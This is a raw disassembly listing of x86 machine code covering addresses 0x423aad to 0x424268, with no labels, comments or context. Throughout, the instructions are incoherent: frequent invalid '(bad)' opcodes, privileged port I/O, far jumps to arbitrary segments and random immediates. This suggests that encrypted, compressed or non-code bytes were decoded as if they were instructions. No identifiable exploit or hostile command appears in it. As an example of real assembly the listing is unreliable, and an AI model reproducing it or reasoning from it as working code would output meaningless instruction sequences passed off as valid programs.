  423aad:	outs   dx,BYTE PTR ds:[esi]
  423aae:	push   ss
  423aaf:	clc    
  423ab0:	push   cs
  423ab1:	adc    eax,0x14102561
  423ab6:	add    BYTE PTR [esi],bh
  423ab8:	(bad)  
  423ab9:	jns    0x423ad9
  423abb:	bound  esp,QWORD PTR [edi+0x5a84e077]
  423ac1:	cmp    dh,BYTE PTR [ecx]
  423ac3:	in     al,dx
  423ac4:	push   ebx
  423ac5:	push   0xae93afbf
  423aca:	call   ecx
  423acc:	mov    DWORD PTR [ebx],esp
  423ace:	leave  
  423acf:	jnp    0x423a51
  423ad1:	fwait
  423ad2:	or     DWORD PTR [eax-0x692e9d53],edx
  423ad8:	xchg   BYTE PTR [ebx-0x32],dh
  423adb:	fs gs xor al,0x95
  423adf:	mov    bh,0xa7
  423ae1:	ficomp DWORD PTR [edx+0x28]
  423ae4:	mov    al,0x8b
  423ae6:	mov    edi,0x9b0a2b93
  423aeb:	(bad)  
  423aec:	jge    0x423afe
  423aee:	push   ds
  423aef:	(bad)  
  423af0:	aam    0xee
  423af2:	mov    dh,0xc2
  423af4:	sub    DWORD PTR [esi+0x7bb528dc],eax
  423afa:	(bad)  
  423afb:	cmp    eax,0xb847c1b7
  423b00:	les    ecx,FWORD PTR [edi+0x62cb1d2d]
  423b06:	jmp    0x935c:0x98a9ae60
  423b0d:	xor    al,0x9f
  423b0f:	or     ch,BYTE PTR ds:0x6cc58b77
  423b15:	mov    esi,DWORD PTR [eax]
  423b17:	jl     0x423afc
  423b19:	cmp    al,BYTE PTR gs:[edi+0x1c322e7a]
  423b20:	fdiv   st(7),st
  423b22:	sub    bl,al
  423b24:	add    ch,BYTE PTR [edi]
  423b26:	js     0x423b64
  423b28:	dec    esp
  423b29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b2a:	lahf   
  423b2b:	mov    dl,0x21
  423b2d:	cwde   
  423b2e:	stos   DWORD PTR es:[di],eax
  423b30:	div    DWORD PTR [edx-0x4667176f]
  423b36:	rdpmc  
  423b38:	les    esi,FWORD PTR [esi]
  423b3a:	push   esi
  423b3b:	(bad)  
  423b3c:	cmc    
  423b3d:	jbe    0x423ac4
  423b3f:	repnz imul ecx,DWORD PTR [edi],0xffffffc0
  423b43:	mov    ebx,0x225f0df7
  423b48:	inc    ecx
  423b49:	push   ebx
  423b4a:	mov    ecx,0xfe6ede1a
  423b4f:	into   
  423b50:	ds leave 
  423b52:	mov    WORD PTR [ebp+0x3beef592],ds
  423b58:	fnstcw WORD PTR [ebx-0x50011b11]
  423b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b5f:	test   eax,0x3af4aea7
  423b64:	cmp    DWORD PTR [eax+0x2e19585e],0x1a
  423b6b:	adc    esi,DWORD PTR [esi+0x1e4695b1]
  423b71:	add    eax,0xd78281e4
  423b76:	jnp    0x423b64
  423b78:	in     al,dx
  423b79:	nop
  423b7a:	inc    ecx
  423b7b:	sar    DWORD PTR [esi-0x235b29f5],1
  423b81:	punpckhdq mm0,mm3
  423b84:	lods   al,BYTE PTR ds:[esi]
  423b85:	lds    ebx,FWORD PTR [eax+0x663900ff]
  423b8b:	ds push eax
  423b8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b8e:	pop    ebx
  423b8f:	pusha  
  423b90:	bound  ebx,QWORD PTR [ebx-0x15]
  423b93:	into   
  423b94:	aas    
  423b95:	pusha  
  423b96:	scas   eax,DWORD PTR es:[edi]
  423b97:	adc    al,0x1d
  423b99:	inc    ecx
  423b9a:	mov    cl,0xe1
  423b9c:	mov    DWORD PTR [eax+0x12],esp
  423b9f:	xor    al,0x11
  423ba1:	mov    edx,0x1e1203f7
  423ba6:	test   BYTE PTR [esi+0x317b2956],ch
  423bac:	lea    esp,[ebp-0x7682c7e3]
  423bb2:	push   esi
  423bb3:	jp     0x423b96
  423bb5:	pop    ds
  423bb6:	ja     0x423c13
  423bb8:	call   0xc57d:0x663dfe91
  423bbf:	mov    cs,edx
  423bc1:	mov    ebx,0x1cf129c8
  423bc6:	lods   eax,DWORD PTR ds:[esi]
  423bc7:	xchg   esp,eax
  423bc8:	repnz scas al,BYTE PTR es:[edi]
  423bca:	outs   dx,BYTE PTR ds:[esi]
  423bcb:	mov    bh,0xe3
  423bcd:	mov    cl,0x89
  423bcf:	call   0xcb85:0x16d1fd42
  423bd6:	jns    0x423bb7
  423bd8:	mov    dh,0x1b
  423bda:	pop    edi
  423bdb:	mov    esi,0x51710b51
  423be0:	sti    
  423be1:	jmp    DWORD PTR [ebp-0x9]
  423be4:	mov    esi,0x68b55dfc
  423be9:	sbb    cl,BYTE PTR [edi+eiz*4-0x18beeeaf]
  423bf0:	into   
  423bf1:	in     al,dx
  423bf2:	arpl   WORD PTR [edx],cx
  423bf4:	jae    0x423c11
  423bf6:	loop   0x423c72
  423bf8:	push   ebx
  423bf9:	xlat   BYTE PTR ds:[ebx]
  423bfa:	sub    ebx,DWORD PTR ds:0xeec60726
  423c00:	mov    dh,0x1
  423c02:	xor    dl,BYTE PTR [edi]
  423c04:	sbb    al,0x76
  423c06:	ja     0x423ba6
  423c08:	sbb    dl,BYTE PTR [edi+0x31ba5d7b]
  423c0e:	add    eax,0x6eb3ae47
  423c13:	out    0x6c,al
  423c15:	iret   
  423c16:	fistp  DWORD PTR [ecx+0x48471c9]
  423c1c:	fcomip st,st(5)
  423c1e:	jne    0x423ba3
  423c20:	ds stos BYTE PTR es:[edi],al
  423c22:	iret   
  423c23:	cmp    dh,BYTE PTR [eax+0x31]
  423c26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c27:	dec    ecx
  423c28:	aaa    
  423c29:	imul   eax,ebp,0x97ce930a
  423c2f:	xchg   ecx,eax
  423c30:	jo     0x423c69
  423c32:	pop    esp
  423c33:	(bad)  
  423c34:	rdtsc  
  423c36:	xchg   ecx,eax
  423c37:	jmp    0x52adf3de
  423c3c:	adc    eax,0x4c6f8cd3
  423c41:	or     esp,DWORD PTR [ebx+0x5d]
  423c44:	sub    dl,BYTE PTR [edx-0x4b6e5fb9]
  423c4a:	push   ds
  423c4b:	loope  0x423c51
  423c4d:	or     BYTE PTR [ecx-0x4a78046f],0x35
  423c54:	aas    
  423c55:	pop    es
  423c56:	fcomp  DWORD PTR [ebx+0x36ab8f44]
  423c5c:	mov    ?,WORD PTR [eax+0x3229ba70]
  423c62:	mov    ds:0x7b58677b,al
  423c67:	std    
  423c68:	in     eax,0x9
  423c6a:	das    
  423c6b:	and    esp,esp
  423c6d:	push   edx
  423c6e:	add    ebp,DWORD PTR [esp+eiz*4+0x45]
  423c72:	push   0x25
  423c74:	add    DWORD PTR [ebp+ecx*4-0x2814b04a],0xf2236e8c
  423c7f:	outs   dx,DWORD PTR ds:[esi]
  423c80:	pop    esi
  423c81:	mov    bh,BYTE PTR [ecx+0x52]
  423c84:	sub    BYTE PTR [ecx-0x155df96],0x9e
  423c8b:	shl    DWORD PTR [ebp+edx*4+0x53b06f2d],1
  423c92:	hlt    
  423c93:	ss or  eax,0x6f38ba87
  423c99:	inc    edi
  423c9a:	sbb    al,0x15
  423c9c:	out    dx,eax
  423c9d:	ficom  WORD PTR [ebx]
  423c9f:	dec    ebp
  423ca0:	leave  
  423ca1:	push   ss
  423ca2:	daa    
  423ca3:	push   es
  423ca4:	(bad)  
  423ca5:	xor    cl,BYTE PTR [esi+0x48daf00]
  423cab:	xchg   ebp,eax
  423cac:	(bad)  
  423cad:	rcl    edx,cl
  423caf:	or     al,0xf7
  423cb1:	pop    edi
  423cb2:	pop    es
  423cb3:	xacquire xchg DWORD PTR [edx],ebp
  423cb6:	rol    DWORD PTR [eax+0x5e],0x1f
  423cba:	fcom   DWORD PTR [ebx+0x33]
  423cbd:	or     al,0xd1
  423cbf:	call   0xf52:0xad8ef992
  423cc6:	jmp    0xab85a432
  423ccb:	jmp    0x64aa61ec
  423cd0:	sub    edx,DWORD PTR [ecx]
  423cd2:	das    
  423cd3:	mov    ds:0x43c1b38e,al
  423cd8:	int    0x57
  423cda:	sbb    dl,BYTE PTR [eax-0x1e]
  423cdd:	lods   eax,DWORD PTR ds:[esi]
  423cde:	mov    ebp,0xa7f732e1
  423ce3:	add    bh,0x3e
  423ce6:	sbb    esi,0x6b
  423ce9:	push   ebp
  423cea:	int3   
  423ceb:	adc    eax,0xae6c61ef
  423cf0:	ficom  DWORD PTR [ecx]
  423cf2:	adc    DWORD PTR [edx+ebx*1-0x27],esi
  423cf6:	shl    BYTE PTR [ebp-0x66500d95],0x8a
  423cfd:	jmp    0xf76f:0x17cd903
  423d04:	fisttp QWORD PTR [ebx-0x4e]
  423d07:	fimul  DWORD PTR [ebx-0x3c655382]
  423d0d:	ret    0xee34
  423d10:	and    BYTE PTR [ebx],cl
  423d12:	xchg   esi,eax
  423d13:	add    DWORD PTR [ebx+edx*4+0x1e3cf21d],edi
  423d1a:	mov    edi,0xefb38233
  423d1f:	outs   dx,BYTE PTR ds:[esi]
  423d20:	rcl    DWORD PTR [esi-0x4],1
  423d23:	jg     0x423d09
  423d25:	mov    DWORD PTR [eax+edx*2-0x2e5b1cdc],eax
  423d2c:	lods   al,BYTE PTR ds:[esi]
  423d2d:	dec    edi
  423d2e:	pop    ebx
  423d2f:	in     al,dx
  423d30:	out    0xbc,eax
  423d32:	(bad)  
  423d33:	pop    edi
  423d34:	test   eax,0xd5b7dd45
  423d39:	iret   
  423d3a:	imul   esp,DWORD PTR [edi+ebp*2+0x186fe0a4],0x112274e8
  423d45:	add    BYTE PTR [eax],al
  423d47:	les    esi,FWORD PTR [eax]
  423d49:	xchg   BYTE PTR [edx+edx*2+0x70],ah
  423d4d:	and    eax,0xaccfc140
  423d52:	rcr    DWORD PTR [eax+0x19],cl
  423d55:	pop    ecx
  423d56:	sbb    al,0x15
  423d58:	addr16 pop ebp
  423d5a:	imul   esp,DWORD PTR [esi-0x247ac5a4],0xfffffff2
  423d61:	or     bl,cl
  423d63:	lds    ebx,FWORD PTR [edx-0x3c]
  423d66:	out    dx,eax
  423d67:	ja     0x423d23
  423d69:	fstp   QWORD PTR [edx+edi*4]
  423d6c:	sbb    eax,0x66b334fd
  423d71:	dec    ebp
  423d72:	and    ecx,esp
  423d74:	cld    
  423d75:	shl    BYTE PTR [ecx+0x1a],1
  423d78:	cmp    ebx,DWORD PTR [ecx-0x7d]
  423d7b:	xor    eax,0x2e48911e
  423d80:	loope  0x423db3
  423d82:	shr    ecx,1
  423d84:	rol    ah,cl
  423d86:	xor    eax,DWORD PTR [edi+0xb]
  423d89:	pop    ss
  423d8a:	or     DWORD PTR [ebp-0x24],ebp
  423d8d:	jmp    FWORD PTR [ebx-0x49]
  423d90:	mov    WORD PTR [edx],?
  423d92:	in     eax,dx
  423d93:	cs (bad) 
  423d95:	popf   
  423d96:	mov    eax,ds:0x3889563e
  423d9b:	sub    DWORD PTR [eax+edi*2],eax
  423d9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d9f:	repz test esi,esp
  423da2:	jbe    0x423da9
  423da4:	hlt    
  423da5:	mov    BYTE PTR [eax+esi*1+0x67dabf02],dl
  423dac:	mov    eax,0xddf05ef8
  423db1:	clc    
  423db2:	bound  ecx,QWORD PTR [edx]
  423db4:	fstp   DWORD PTR ds:0x6efe637c
  423dba:	mov    esp,0x3f67d28d
  423dbf:	cmp    ebp,DWORD PTR [eax+0x41]
  423dc2:	dec    edx
  423dc3:	jb     0x423dae
  423dc5:	jnp    0x423e0f
  423dc7:	aas    
  423dc8:	xor    eax,0x19eb4254
  423dcd:	xchg   esi,eax
  423dce:	outs   dx,DWORD PTR ds:[esi]
  423dcf:	xor    al,0xad
  423dd1:	int3   
  423dd2:	imul   edx
  423dd4:	ds inc ebx
  423dd6:	outs   dx,BYTE PTR ds:[esi]
  423dd7:	adc    DWORD PTR [edi],0xe585c800
  423ddd:	and    dh,BYTE PTR [eax]
  423ddf:	push   eax
  423de0:	adc    ecx,ebp
  423de2:	push   edx
  423de3:	mov    edx,0x8187c007
  423de8:	aaa    
  423de9:	loopne 0x423e08
  423deb:	ins    DWORD PTR es:[edi],dx
  423dec:	dec    ebx
  423ded:	popa   
  423dee:	addr16 aas 
  423df0:	call   0xe7b8:0xf928d60a
  423df7:	mov    edx,DWORD PTR [eax]
  423df9:	mov    ecx,0x36fd3de3
  423dfe:	jle    0x423d88
  423e00:	sbb    bl,BYTE PTR [ecx+0x6e49e026]
  423e06:	push   esi
  423e07:	adc    BYTE PTR [eax+esi*2],dl
  423e0a:	or     DWORD PTR [esi+0x67966a77],ecx
  423e10:	pop    ebx
  423e11:	xchg   DWORD PTR [ecx+0x47],ebx
  423e14:	sbb    BYTE PTR [edi-0x13],al
  423e17:	fbstp  TBYTE PTR [ebp+0x63]
  423e1a:	sti    
  423e1b:	jo     0x423de8
  423e1d:	sahf   
  423e1e:	cli    
  423e1f:	jmp    0xac51:0xbad6bc03
  423e26:	jno    0x423dbd
  423e28:	mov    bh,0x8e
  423e2a:	mov    BYTE PTR [eax],ch
  423e2c:	fwait
  423e2d:	mov    dh,0x20
  423e2f:	or     esp,DWORD PTR [ebx+edx*2+0x6]
  423e33:	cwde   
  423e34:	hlt    
  423e35:	jp     0x423e34
  423e37:	jge    0x423dd1
  423e39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e3a:	jecxz  0x423e97
  423e3c:	sub    esi,DWORD PTR [edx+0x57073daa]
  423e42:	mov    eax,ds:0x74846d73
  423e47:	out    dx,al
  423e48:	icebp  
  423e49:	test   eax,0xdb870eee
  423e4e:	aaa    
  423e4f:	sub    ebx,edx
  423e51:	js     0x423ea3
  423e53:	ror    BYTE PTR [ebx],0xd9
  423e56:	or     eax,DWORD PTR [ebx]
  423e58:	push   ds
  423e59:	pop    eax
  423e5a:	dec    edx
  423e5b:	scas   al,BYTE PTR es:[edi]
  423e5c:	push   ebx
  423e5d:	push   ebp
  423e5e:	mov    al,0xfc
  423e60:	add    BYTE PTR [ecx],al
  423e62:	cmp    edx,DWORD PTR [eax+0x706452b1]
  423e68:	in     al,dx
  423e69:	mov    eax,DWORD PTR [edx-0x4f]
  423e6c:	repnz sub eax,DWORD PTR [esi+0x57]
  423e70:	sub    ch,BYTE PTR [eax+0x74ec670a]
  423e76:	in     al,0x7a
  423e78:	adc    DWORD PTR [ebx+edx*4+0x23],eax
  423e7c:	adc    eax,0x9bc122f9
  423e81:	enter  0x91a1,0x4e
  423e85:	jl     0x423e15
  423e87:	xor    cl,bl
  423e89:	push   ss
  423e8a:	mov    bh,0x86
  423e8c:	pop    ecx
  423e8d:	test   BYTE PTR [edx],ah
  423e8f:	cmp    ah,dl
  423e91:	scas   eax,DWORD PTR es:[edi]
  423e92:	scas   eax,DWORD PTR es:[edi]
  423e93:	(bad)  
  423e94:	loopne 0x423e86
  423e96:	neg    DWORD PTR [eax+0x2e]
  423e99:	inc    ebp
  423e9a:	and    edx,DWORD PTR [ebp-0x18]
  423e9d:	ret    0x58f2
  423ea0:	sub    eax,0x9d93a362
  423ea5:	sbb    edi,ebx
  423ea7:	test   DWORD PTR [edx+0x61],eax
  423eaa:	push   ebx
  423eab:	fistp  DWORD PTR [bp+si]
  423eae:	inc    edi
  423eaf:	or     edx,DWORD PTR [eax+ecx*1+0x21ea12c5]
  423eb6:	scas   eax,DWORD PTR es:[edi]
  423eb7:	cmp    dh,0xef
  423eba:	cdq    
  423ebb:	push   0x56baf376
  423ec0:	ffreep st(2)
  423ec2:	jno    0x423e5b
  423ec4:	sbb    al,0xff
  423ec6:	or     BYTE PTR [ecx-0x7c],0x32
  423eca:	les    ebx,FWORD PTR [ebx-0x3ec8d032]
  423ed0:	pusha  
  423ed1:	and    DWORD PTR [edi+0x7f],ebp
  423ed4:	and    cl,bh
  423ed6:	sbb    al,0xaa
  423ed8:	fisttp QWORD PTR [edi+eiz*8+0x31]
  423edc:	dec    esp
  423edd:	cld    
  423ede:	push   edi
  423edf:	idiv   DWORD PTR [edx-0x2cd4c10e]
  423ee5:	sbb    DWORD PTR [edi+0x6f683472],ebp
  423eeb:	or     DWORD PTR [esi+ebp*8+0x35],edx
  423eef:	mov    ebp,0x2fbfddaf
  423ef4:	pusha  
  423ef5:	shr    DWORD PTR [edi+0x40dfe3e1],cl
  423efb:	fist   DWORD PTR [edx-0x41bc2511]
  423f01:	(bad)  
  423f03:	jmp    0x61aa:0xf5a72fb9
  423f0a:	retf   
  423f0b:	sub    DWORD PTR [ebp+ebp*4+0x73],esp
  423f0f:	das    
  423f10:	loop   0x423f45
  423f12:	scas   eax,DWORD PTR es:[edi]
  423f13:	mov    al,0x92
  423f15:	push   ss
  423f16:	push   eax
  423f17:	mov    ebp,0xcd143eea
  423f1c:	loope  0x423ea2
  423f1e:	mov    cl,0x1a
  423f20:	fs fwait
  423f22:	adc    al,0x9d
  423f24:	outs   dx,BYTE PTR ds:[esi]
  423f25:	pushf  
  423f26:	sub    DWORD PTR [ebx+0x1fb1774b],ebp
  423f2c:	fisttp WORD PTR [esi-0x1f]
  423f2f:	aas    
  423f30:	fwait
  423f31:	aam    0xab
  423f33:	(bad)  
  423f34:	loop   0x423f5c
  423f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f37:	inc    eax
  423f38:	mov    edi,0xbad4a6a2
  423f3d:	lods   al,BYTE PTR ds:[esi]
  423f3e:	clc    
  423f3f:	lds    edi,FWORD PTR ds:[esi+0x22]
  423f43:	lds    esi,FWORD PTR [eax-0x60ff8543]
  423f49:	gs inc esi
  423f4b:	in     al,0x99
  423f4d:	mov    ds:0xc95f9635,eax
  423f52:	dec    esp
  423f53:	ret    
  423f54:	add    ebp,DWORD PTR [edx+0x21]
  423f57:	outs   dx,DWORD PTR ds:[esi]
  423f58:	(bad)  
  423f59:	clc    
  423f5a:	pusha  
  423f5b:	dec    esi
  423f5c:	jb     0x423fdc
  423f5e:	cmc    
  423f5f:	icebp  
  423f60:	(bad)  
  423f61:	out    dx,eax
  423f62:	dec    ecx
  423f63:	enter  0xa9b0,0x97
  423f67:	into   
  423f68:	mov    bl,0xf9
  423f6a:	jle    0x423ef5
  423f6c:	fdiv   QWORD PTR ds:0xfbddaed6
  423f72:	jecxz  0x423f69
  423f74:	into   
  423f75:	adc    ebx,esp
  423f77:	jg     0x423f89
  423f79:	mov    ds:0xc883e500,eax
  423f7e:	jnp    0x423fce
  423f80:	ret    0xe03
  423f83:	dec    ecx
  423f84:	push   eax
  423f85:	xor    ch,BYTE PTR [edi-0x73]
  423f88:	nop
  423f89:	in     eax,0xa3
  423f8b:	jg     0x423fbb
  423f8d:	xchg   edi,eax
  423f8e:	add    esi,DWORD PTR [ecx-0x23]
  423f91:	repnz inc eax
  423f93:	push   ebx
  423f94:	jecxz  0x423f5d
  423f96:	dec    eax
  423f97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f98:	je     0x423faa
  423f9a:	ror    edi,cl
  423f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f9d:	xor    BYTE PTR [ebx-0x6448cf2c],dl
  423fa3:	inc    ecx
  423fa4:	cmp    eax,DWORD PTR [eax]
  423fa6:	lods   al,BYTE PTR ds:[esi]
  423fa7:	xor    BYTE PTR [ebx],dh
  423fa9:	and    al,0xa2
  423fab:	adc    eax,0x8f9836d6
  423fb0:	ficomp WORD PTR [eax]
  423fb2:	aad    0x5f
  423fb4:	or     BYTE PTR cs:[edx+0x63],0x2
  423fb9:	add    esp,DWORD PTR [eax+0x6822dda3]
  423fbf:	sahf   
  423fc0:	sbb    al,0xf
  423fc2:	add    BYTE PTR [ecx-0x40],bl
  423fc5:	push   edx
  423fc6:	push   edx
  423fc7:	loop   0x424035
  423fc9:	dec    ecx
  423fca:	mov    ch,BYTE PTR [eax-0xee3e99f]
  423fd0:	pavgw  mm0,QWORD PTR [edi+0x5204db21]
  423fd7:	aaa    
  423fd8:	push   esi
  423fd9:	or     eax,0x4dbd1838
  423fde:	inc    ebp
  423fdf:	push   cs
  423fe0:	sub    al,0x16
  423fe2:	adc    edx,DWORD PTR [edx]
  423fe4:	or     BYTE PTR [esi+0x2d851ca6],0xf6
  423feb:	mov    ds:0xab07cab2,al
  423ff0:	ss mov cl,0x61
  423ff3:	push   ebx
  423ff4:	stos   DWORD PTR es:[edi],eax
  423ff5:	jno    0x42402d
  423ff7:	scas   al,BYTE PTR es:[edi]
  423ff8:	xor    dh,cl
  423ffa:	lea    ebx,[edx+0x1b]
  423ffd:	stos   DWORD PTR es:[edi],eax
  423ffe:	ja     0x423ff7
  424000:	jge    0x424055
  424002:	cdq    
  424003:	add    ecx,edi
  424005:	jl     0x423f97
  424007:	ret    0xf6fd
  42400a:	sbb    bh,bh
  42400c:	add    dl,BYTE PTR [edi-0x76b0335f]
  424012:	in     eax,0x16
  424014:	xchg   ebp,eax
  424015:	ds dec eax
  424017:	aaa    
  424018:	sbb    eax,0x3786bd10
  42401d:	lahf   
  42401e:	pusha  
  42401f:	xor    eax,0xdc33436a
  424024:	das    
  424025:	pop    esi
  424026:	mov    cl,0xab
  424028:	inc    ecx
  424029:	mov    ss,WORD PTR [edx+esi*2]
  42402c:	call   0xf8bf556e
  424031:	sbb    BYTE PTR [edi+0x4cba7ed0],cl
  424037:	push   es
  424038:	enter  0xec1f,0x26
  42403c:	cwde   
  42403d:	dec    ecx
  42403e:	bound  eax,QWORD PTR [ebx-0x5588c55a]
  424044:	sub    al,0x22
  424046:	loopne 0x4240b3
  424048:	jge    0x42400c
  42404a:	lahf   
  42404b:	push   ss
  42404c:	shl    ebx,cl
  42404e:	inc    esi
  42404f:	cdq    
  424050:	adc    eax,0x1bcce6b8
  424055:	mov    BYTE PTR [edx-0x211cd82e],dl
  42405b:	test   al,0x93
  42405d:	and    ebp,DWORD PTR [ebp-0x63]
  424060:	lods   eax,DWORD PTR ds:[esi]
  424061:	push   cs
  424062:	sub    DWORD PTR [edx-0x216c8c0c],ebp
  424068:	fwait
  424069:	lahf   
  42406a:	shr    BYTE PTR [edx+esi*2],0xda
  42406e:	stos   BYTE PTR es:[edi],al
  42406f:	(bad)  [esi+0xaa1a8f6]
  424075:	in     eax,0xaa
  424077:	loopne 0x424001
  424079:	rcr    ch,0xc4
  42407c:	fiadd  WORD PTR [edx]
  42407e:	mov    ds:0x3f6f216c,eax
  424083:	fiadd  DWORD PTR [edx+0x35]
  424086:	call   0x85a37013
  42408b:	jae    0x42406c
  42408d:	mov    edi,0x9f70eabe
  424092:	mov    bl,0xff
  424094:	mov    edx,0xb53fda89
  424099:	scas   al,BYTE PTR es:[edi]
  42409a:	pop    ebx
  42409b:	xor    BYTE PTR [eax],dh
  42409d:	push   ecx
  42409e:	iret   
  42409f:	test   DWORD PTR [edx+eiz*4+0x78c4d2d6],ebp
  4240a6:	adc    eax,0x91355a58
  4240ab:	cmp    dh,al
  4240ad:	jns    0x4240cc
  4240af:	mov    cl,ch
  4240b1:	xlat   BYTE PTR ds:[ebx]
  4240b2:	cmc    
  4240b3:	test   DWORD PTR [edi-0x33],0x5a73448e
  4240ba:	shl    DWORD PTR [esi+0x3],0x7f
  4240be:	xor    eax,0x64116bb0
  4240c3:	jnp    0x424109
  4240c5:	aam    0x81
  4240c7:	or     DWORD PTR [edx-0x632a9a0e],ecx
  4240cd:	push   ds
  4240ce:	dec    ecx
  4240cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240d0:	les    eax,FWORD PTR [esi-0x4d572688]
  4240d6:	shl    DWORD PTR [esi+0x87bf76b],1
  4240dc:	fcmovu st,st(0)
  4240de:	or     al,0xd
  4240e0:	aas    
  4240e1:	pcmpeqw mm2,QWORD PTR [edx+0x25]
  4240e5:	(bad)  
  4240e7:	xchg   ebx,eax
  4240e8:	fsub   QWORD PTR [esi]
  4240ea:	pop    ds
  4240eb:	shl    ebx,cl
  4240ed:	mov    dl,0x26
  4240ef:	mov    bl,BYTE PTR [eax-0x3ee78749]
  4240f5:	ficom  DWORD PTR [ecx+edx*8+0x37]
  4240f9:	lock mov bl,0x40
  4240fc:	sbb    ecx,DWORD PTR [eax+0x271dfa1c]
  424102:	sbb    edi,DWORD PTR [ebp-0x1b8da34b]
  424108:	add    DWORD PTR [ebx-0x39],ecx
  42410b:	inc    edx
  42410c:	cmc    
  42410d:	ins    DWORD PTR es:[edi],dx
  42410e:	lahf   
  42410f:	mov    ch,0xfc
  424111:	outs   dx,DWORD PTR ds:[esi]
  424112:	jae    0x4240c7
  424114:	popf   
  424115:	or     esi,edx
  424117:	inc    ebx
  424118:	shl    DWORD PTR [eax-0x7d],1
  42411b:	out    dx,eax
  42411c:	ins    BYTE PTR es:[edi],dx
  42411d:	lock out 0xcd,al
  424120:	mov    ecx,eax
  424122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424123:	loopne 0x424127
  424125:	fiadd  DWORD PTR [ebx+ebx*2+0x3b]
  424129:	in     eax,0x4b
  42412b:	(bad)  
  42412c:	cmp    bl,BYTE PTR [esi+0x22]
  42412f:	lods   eax,DWORD PTR ds:[esi]
  424130:	push   0x442b0fb9
  424135:	push   esi
  424136:	test   BYTE PTR [ecx+0x57],0x84
  42413a:	xlat   BYTE PTR ds:[ebx]
  42413b:	leave  
  42413c:	outs   dx,BYTE PTR ds:[esi]
  42413d:	jg     0x42416c
  42413f:	ret    0xd63d
  424142:	hlt    
  424143:	mov    ch,0xd5
  424145:	pop    ebp
  424146:	aad    0x28
  424148:	dec    esp
  424149:	push   cs
  42414a:	in     al,dx
  42414b:	sbb    BYTE PTR es:[edx+0x12],0x11
  424150:	int3   
  424151:	dec    ebp
  424152:	neg    bh
  424154:	add    al,0xf6
  424156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424157:	outs   dx,DWORD PTR ds:[esi]
  424158:	mov    ah,0x57
  42415a:	add    al,0x4c
  42415c:	jl     0x424137
  42415e:	adc    DWORD PTR [ebx-0x20],ebx
  424161:	outs   dx,DWORD PTR ds:[esi]
  424162:	sbb    al,0xf9
  424164:	sete   BYTE PTR [edx-0x7b03ced7]
  42416b:	out    0xb7,eax
  42416d:	(bad)  
  42416e:	ja     0x424113
  424170:	repnz adc al,0xef
  424173:	inc    ebx
  424174:	mov    al,ds:0xf52bb599
  424179:	out    dx,al
  42417a:	sub    BYTE PTR [edi-0xd],cl
  42417d:	aam    0x6e
  42417f:	push   ebx
  424180:	and    eax,0x3d2eb6fd
  424185:	cld    
  424186:	sbb    edi,DWORD PTR [esi]
  424188:	cmp    al,0xf0
  42418a:	push   ds
  42418b:	lods   al,BYTE PTR ds:[esi]
  42418c:	stos   BYTE PTR es:[edi],al
  42418d:	pop    eax
  42418e:	pushf  
  42418f:	dec    ebp
  424190:	jo     0x42417b
  424192:	adc    ah,cl
  424194:	retf   
  424195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424196:	or     edi,DWORD PTR [ebp+0x2cb7a132]
  42419c:	imul   ebx,DWORD PTR [esi],0x122d3f36
  4241a2:	cdq    
  4241a3:	std    
  4241a4:	jmp    0xbdabe9da
  4241a9:	mov    ch,0xfd
  4241ab:	enter  0x2622,0xba
  4241af:	iret   
  4241b0:	mov    eax,0x3a65edc4
  4241b5:	sti    
  4241b6:	cli    
  4241b7:	in     eax,0x44
  4241b9:	fidiv  DWORD PTR [ebp+esi*8-0x3081082d]
  4241c0:	out    dx,al
  4241c1:	and    eax,0x64d64add
  4241c6:	lock jle 0x4241f5
  4241c9:	sbb    DWORD PTR ds:0x9e2a2b6e,0x2b
  4241d0:	and    al,0x4e
  4241d2:	cld    
  4241d3:	xchg   edx,eax
  4241d4:	xchg   ebp,eax
  4241d5:	mov    eax,0x9481b6c
  4241da:	jmp    0x8d4a8e76
  4241df:	into   
  4241e0:	fmul   QWORD PTR [edi-0x44]
  4241e3:	cmp    eax,0x7cfaa04c
  4241e8:	adc    ebx,DWORD PTR [eax+0x3f]
  4241eb:	pop    ebx
  4241ec:	sbb    BYTE PTR [ecx+0x3],0x36
  4241f0:	out    dx,eax
  4241f1:	sahf   
  4241f2:	push   ss
  4241f3:	lock sbb DWORD PTR [edx],eax
  4241f6:	xlat   BYTE PTR ds:[ebx]
  4241f7:	mov    edx,0xd76fc1fd
  4241fc:	push   es
  4241fd:	lds    esp,FWORD PTR [eax+0xab764d2]
  424203:	cmp    eax,0x9ccd6dc3
  424208:	ins    DWORD PTR es:[edi],dx
  424209:	sbb    al,0x6d
  42420b:	mov    al,0x52
  42420d:	dec    DWORD PTR [esi+edx*2-0xf860d3f]
  424214:	loop   0x424218
  424216:	mov    cl,0xad
  424218:	test   al,0x7b
  42421a:	in     al,dx
  42421b:	retf   
  42421c:	add    eax,0x432fff75
  424221:	adc    eax,0xfb294c2f
  424226:	loope  0x42422c
  424228:	xor    BYTE PTR [eax+0x5b230b3],bl
  42422e:	sub    eax,0x63dace9a
  424233:	sbb    al,0x8a
  424235:	dec    eax
  424236:	cld    
  424237:	mov    ds:0x74a6a9f4,al
  42423c:	sub    eax,0xe03f5a75
  424241:	jo     0x4242a6
  424243:	cmp    dl,BYTE PTR [eax-0x7]
  424246:	in     eax,dx
  424247:	retf   
  424248:	or     al,0xf9
  42424a:	jns    0x42422d
  42424c:	loope  0x424242
  42424e:	or     dl,ah
  424250:	ins    DWORD PTR es:[edi],dx
  424251:	cmp    ebx,ecx
  424253:	(bad)  
  424254:	icebp  
  424255:	std    
  424256:	cmp    eax,0xaaf91f5d
  42425b:	int3   
  42425c:	inc    edx
  42425d:	sub    BYTE PTR [edi+0x52fe114],0x2a
  424264:	rol    BYTE PTR [bp+si],cl
  424267:	(bad)  
  424268:	dec    ebp
